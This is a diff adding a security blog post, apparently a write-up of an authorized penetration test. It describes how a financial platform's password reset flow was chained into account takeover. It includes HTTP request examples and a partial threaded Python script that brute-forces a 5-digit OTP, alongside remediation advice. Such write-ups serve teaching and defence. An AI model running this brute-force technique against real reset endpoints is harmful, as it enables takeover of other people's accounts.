@@ -1,0 +1,135 @@
+---
+title: "90 Seconds to Account Takeover: Four Small Flaws in One Password Reset"
+date: "2026-11-25"
+dateLabel: "2026"
+description: "A reset token returned in the API response, a 5-digit OTP, no rate limiting and an expiry that only existed in the email text. Each one is minor. Together they took over an account knowing nothing but its email address."
+tags: ["Web", "API Security", "Password Reset", "Account Takeover", "Brute Force"]
+---
+
+## Small Bugs, Multiplied
+
+Password reset flows rarely fail because of one dramatic bug. They fail because of several small decisions that each look acceptable in isolation: "the token is random anyway", "5 digits is what users can type", "the WAF will catch abuse", "the email says it expires in 2 minutes". An attacker does not need any one of them to be catastrophic. They need them to multiply.
+
+When I test a reset flow I write down every secret involved (token, OTP, session), and for each one I ask three questions: **where is it delivered, how many guesses does the server allow, and when does it really expire?**
+
+## Background
+
+This was a web assessment of a financial platform where customers manage investments online. The reset flow had three steps: request a reset with your email, enter the one-time code sent to your inbox, choose a new password. It looked standard. Asking those three questions about each secret broke it.
+
+<FlowChart
+  title="Reset Flow Account Takeover"
+  steps={[
+    { label: "Step 1", title: "Request reset with victim email", subtitle: "Reset token returned in the JSON response", tone: "warn" },
+    { label: "Step 2", title: "Brute-force the 5-digit OTP", subtitle: "No lockout, no throttling, ~43 req/s", tone: "warn" },
+    { label: "Step 3", title: "Expiry not enforced", subtitle: "Token still valid past the stated 2 minutes", tone: "warn" },
+    { label: "Step 4", title: "Set a new password", subtitle: "Token + recovered OTP accepted", tone: "critical" },
+    { label: "Result", title: "Valid session for the account", subtitle: "~90 seconds, email address only", tone: "critical" },
+  ]}
+/>
+
+## Flaw 1: The Token Comes Back in the Response
+
+Requesting a reset with the target's email returned the reset token in the response body:
+
+```http
+POST /password-reset/request HTTP/1.1
+Content-Type: application/json
+
+{"email": "<target>"}
+```
+
+```http
+HTTP/1.1 201 Created
+
+{"token": "<reset-token>", "email": "<target>", "anonymized_email": "j*****n@..."}
+```
+
+The whole point of a reset token is that only the owner of the inbox gets it. Returning it to whoever asked removes that property. On its own, though, the token was not enough: the next step also required the OTP from the email.
+
+## Flaws 2 and 3: A 5-Digit OTP With Unlimited Guesses
+
+The OTP was numeric and 5 digits long: 100,000 possibilities. A wrong code returned `{"valid": false}` from the server, so validation was genuinely server-side. The problem was that the server never stopped answering.
+
+<Concept>
+**Rate limiting** turns a small keyspace into a safe one. A 5-digit code with a lockout after 5 attempts gives an attacker a 0.005% chance. The same code with unlimited attempts is not a secret at all, it is a short loop. Entropy and attempt limits are one control, not two separate ones.
+</Concept>
+
+I wrote a small script that pinned a single token and swept the OTP space with 60 threads over keep-alive connections. It ran at about 43 requests per second without a single lockout, throttle or error. The script also detected the case where the token stopped being valid, so I could tell the difference between "wrong guess" and "token died":
+
+```python
+# Simplified from the engagement PoC (authorized test window, own test account).
+import http.client, json, queue, ssl, threading
+
+HOST, BASE = "<api-host>", "/api"
+THREADS = 60
+found, q, lock = None, queue.Queue(), threading.Lock()
+for i in range(100_000):
+    q.put(i)
+
+def post(conn, path, payload):
+    conn.request("POST", BASE + path, json.dumps(payload),
+                 {"Content-Type": "application/json"})
+    r = conn.getresponse()
+    return r.status, r.read().decode()
+
+def worker(token):
+    global found
+    conn = http.client.HTTPSConnection(HOST, context=ssl.create_default_context())
+    while found is None:
+        try:
+            otp = "%05d" % q.get_nowait()
+        except queue.Empty:
+            return
+        status, body = post(conn, "/password-reset/verify-otp",
+                            {"token": token, "otp": otp})
+        if '"valid":true' in body:
+            with lock:
+                found = otp
+```
+
+The correct code came up after **3,676 attempts, roughly 90 seconds**.
+
+## Flaw 4: The Expiry Was Only in the Email
+
+The reset email told the user the code was valid for 2 minutes. The server did not enforce that: the same token was still accepted at 2 minutes 45 seconds. A separate endpoint to resend the code also extended its life. That matters because it removes the attacker's time pressure. Even at a slower rate, the brute force would have finished.
+
+## Putting It Together
+
+With the token from Flaw 1 and the OTP from the brute force, the final step accepted a new password:
+
+```http
+POST /password-reset/complete HTTP/1.1
+Content-Type: application/json
+
+{"token": "<reset-token>", "email": "<target>", "password": "<new>", "confirm_password": "<new>"}
+```
+
+```http
+HTTP/1.1 200 OK
+
+{"message": "Password changed successfully"}
+```
+
+Logging in with the new password returned access and refresh tokens. In my test the login also did not ask for the email second factor, because of a separate issue in how trusted devices were handled, which I am leaving out of this post.
+
+## What I Could and Could Not Prove
+
+The whole chain was executed end to end against my own test account, inside an authorized testing window with the client's SOC aware of the activity: the token leak, the brute force, the expired-but-valid token, the password change and the resulting session. I did not run it against real customer accounts. The attack needs nothing per victim except an email address, so the same steps would apply to any account.
+
+## Impact
+
+- **Account takeover of any customer** knowing only their email: no inbox access, no user interaction, no network position
+- **Fully automatable**: about 90 seconds per account, trivially parallelized across many targets
+- **Access to the account's financial data and actions**, in a regulated financial context
+
+## Remediation
+
+- **Never return the reset token** in the API response. Reply with a generic message and deliver secrets only through the verified channel
+- **Lock out after 3 to 5 failed OTP attempts** per token, invalidate the token and require restarting the flow. Add per-IP and per-account limits on top
+- **Enforce expiry on the server** on every request, invalidate after one successful use, and make sure "resend" issues a new code instead of extending the old one
+- **Increase OTP entropy** (6 to 8 digits or alphanumeric) as defense in depth, not as a replacement for lockout
+- **Require the second factor** on the first login after a password reset
+
+---
+
+*Vulnerability details have been generalized to protect client confidentiality. The issue was reported during an authorized engagement and has since been remediated.*
